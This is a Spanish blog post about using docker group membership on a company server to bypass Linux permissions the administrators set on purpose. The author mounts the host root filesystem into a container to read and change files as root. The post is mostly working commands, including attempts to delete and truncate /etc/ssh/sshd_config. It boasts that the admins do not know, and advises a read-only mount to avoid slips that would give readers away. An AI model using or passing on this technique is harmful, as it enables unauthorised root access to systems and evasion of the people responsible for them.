Title: Usando Docker para saltarse los permisos de Linux
Slug: usando-docker-para-saltarse-los-permisos-de-linux
Date: 2018-12-17 10:00
Category: Operaciones
Tags: docker, permisos, linux



Según el paradigma de externalización de mi empresa, todos los sistemas son gestionados por un tercero, a base de cambios. Por petición mia, tengo un usuario nominal de SSH y puedo entrar a mirar logs y configuraciones, pero no todas. Lo que no saben es que puedo hacer de todo.

El otro día intenté mirar una configuración de sistema (concretamente el `/etc/ssh/sshd_config`) para ver si había una configuración específica de enjaulado de los usuarios, puesto que se trata de un SFTP público.

```bash
gerard@atlantis:/etc/ssh$ cat sshd_config
cat: sshd_config: Permiso denegado
gerard@atlantis:/etc/ssh$
```

No se quien es el paranoico que pidió estos permisos, pero me toca pasar por el aro; o bien solicito que me lo pasen, o bien pido permisos de *sudo* o similar. Pero hay una manera que no va a tardar días, y que los técnicos que lo llevan no han controlado: el servidor tiene **docker** instalado, y mi usuario pertenece al grupo.

Eso me permite ejecutar un contenedor con el *uid* que yo quiera, siendo el *uid* por defecto el "0" que es el usuario **root**.

```bash
gerard@atlantis:~$ docker run -ti --rm -u 70 alpine:3.8
/ $ grep 70 /etc/passwd
postgres:x:70:70::/var/lib/postgresql:/bin/sh
/ $ whoami
postgres
/ $ id
uid=70(postgres) gid=70(postgres)
/ $
```

**NOTA**: La traducción entre el *uid* "70" y el usuario "postgres" se hace en base al fichero `/etc/passwd` **del contenedor**.

Solo nos queda montar el sistema de ficheros del servidor en una carpeta cualquiera como un volumen y así puedo ver y modificar lo que ya quiera.

```bash
gerard@atlantis:~$ docker run -ti --rm -v /:/host alpine:3.8
/ # whoami
root
/ # cat /host/etc/ssh/sshd_config
#       $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.
...
/ #
```

Si solo pretendéis ver, montad el volúmen con la opción *readonly*, y os váis a evitar elgún error que os pueda delatar. Sin embargo, si váis a hacer modificaciones meditadas y conscientes, adelante.

```bash
gerard@atlantis:~$ docker run -ti --rm -v /:/host:ro alpine:3.8
/ # whoami
root
/ # rm /host/etc/ssh/sshd_config
rm: remove '/host/etc/ssh/sshd_config'? y
rm: can't remove '/host/etc/ssh/sshd_config': Read-only file system
/ # echo 'destroyed' > /host/etc/ssh/sshd_config
/bin/sh: can't create /host/etc/ssh/sshd_config: Read-only file system
/ # truncate -s 0 /host/etc/ssh/sshd_config
truncate: /host/etc/ssh/sshd_config: open: Read-only file system
/ #
```

Recordad que lo que hagáis a partir de aquí queda bajo vuestra propia responsabilidad... Sed cautos
